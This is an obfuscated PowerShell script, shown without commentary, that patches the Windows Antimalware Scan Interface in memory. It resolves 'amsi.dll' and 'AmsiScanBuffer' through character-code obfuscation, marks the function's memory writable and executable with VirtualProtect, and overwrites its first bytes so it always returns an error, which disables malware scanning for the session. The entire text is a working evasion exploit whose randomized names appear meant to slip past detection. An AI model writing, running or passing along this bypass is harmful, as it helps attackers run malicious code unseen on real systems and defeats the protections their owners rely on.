$dmMzYooJSM1 = @"
using System;
using System.Runtime.InteropServices;
public class dmMzYooJSM1 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr q9LaOfVLc, string FKBD6BhuO_sL2j4NeZW);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr unl9, UIntPtr ZiW7ghGFof, uint NquIpiAx4, out uint vsT5sza);
}
"@

Add-Type $dmMzYooJSM1

$byQbgVakduNqr = [dmMzYooJSM1]::LoadLibrary("$(('âmsì.'+'dll').NoRmalIze([CHAr]([bYtE]0x46)+[CHAr](22+89)+[cHaR](101+13)+[ChAr]([bYte]0x6d)+[chAR](68*34/34)) -replace [cHAr](92)+[chAr]([BYTe]0x70)+[chAR](123)+[CHar](77)+[ChaR](110*47/47)+[chAR](125*2/2))")
$wbycK1ZZNVbLLilLcFlj = [dmMzYooJSM1]::GetProcAddress($byQbgVakduNqr, "$([ChAr](65*42/42)+[chAr](28+81)+[chAR]([BYTe]0x73)+[char]([BYTE]0x69)+[ChAr](57+26)+[CHAr]([bytE]0x63)+[CHaR](97*70/70)+[chAR](110)+[CHAR]([BYtE]0x42)+[CHaR](117+100-100)+[char](102*100/100)+[ChaR](102*37/37)+[chaR]([bYTe]0x65)+[Char](114*37/37))")
$p = 0
[dmMzYooJSM1]::VirtualProtect($wbycK1ZZNVbLLilLcFlj, [uint32]5, 0x40, [ref]$p)
$w5nMaSo = "0xB8"
$OogNzurpzu93IcmtcBu3 = "0x57"
$LWsdBJzHvZyXa9ZOv = "0x00"
$o9cXP9XoKxLMv9JyT_bl = "0x07"
$wddN = "0x80"
$LDx1oxgG_Ce = "0xC3"
$KpvFJCQ8vg = [Byte[]] ($w5nMaSo,$OogNzurpzu93IcmtcBu3,$LWsdBJzHvZyXa9ZOv,$o9cXP9XoKxLMv9JyT_bl,+$wddN,+$LDx1oxgG_Ce)
[System.Runtime.InteropServices.Marshal]::Copy($KpvFJCQ8vg, 0, $wbycK1ZZNVbLLilLcFlj, 6)